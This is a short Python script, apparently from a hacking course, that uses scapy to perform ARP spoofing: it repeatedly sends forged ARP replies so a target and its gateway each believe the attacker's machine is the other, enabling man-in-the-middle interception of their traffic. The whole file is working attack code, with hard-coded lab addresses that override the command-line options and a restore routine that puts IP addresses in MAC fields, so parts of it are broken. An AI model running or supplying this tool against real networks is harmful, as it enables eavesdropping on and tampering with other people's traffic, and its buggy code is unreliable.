import scapy.all  as scapy
import time
import optparse
def get_mac_address(ip):
    arp_request_packet=scapy.ARP(pdst=ip)
    #scapy.ls(scapy.ARP())
    broadcast_packet=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    #scapy.ls(scapy.ARP())
    combined_packet = broadcast_packet/arp_request_packet
    answered_list=scapy.srp(combined_packet,timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc
def arp_poisoning(target_ip,poisoned_ip):
    target_mac=get_mac_address(target_ip)
    arp_response=scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)
    scapy.send(arp_response,verbose=False)
    #scapy.ls(scapy.ARP())

def reset_operation(fooled_ip, gateway_ip):
    target_mac=get_mac_address(fooled_ip)
    arp_response=scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_ip,psrc=gateway_ip,hwsrc=gateway_ip)
    scapy.send(arp_response,verbose=False,count=6)
def get_user_input():
    parse_object=optparse.OptionParser()
    parse_object.add_option("-t","--target",dest="target_ip",help="Enter Target IP")
    parse_object.add_option("-g","--gateway",dest="gateway_ip",help="Enter Gateway Ip")
    options=parse_object.parse_args()[0]
    if not options.target_ip and options.gateway_ip:
        print("Enter all ips address!")
    return  options
counter=0
user_ips=get_user_input()
user_target_ip=user_ips.target_ip
user_gateway_ip=user_ips.gateway_ip

try:
    while True:
        arp_poisoning("10.0.2.4","10.0.2.1")
        arp_poisoning("10.0.2.1","10.0.2.4")
        counter+=2
        print("\rSending Packets "+ str(counter),end="")
        time.sleep(3)
except KeyboardInterrupt:
    print("\n QUIT & RESET ")
    reset_operation(user_target_ip,user_gateway_ip)
    reset_operation(user_gateway_ip,user_target_ip)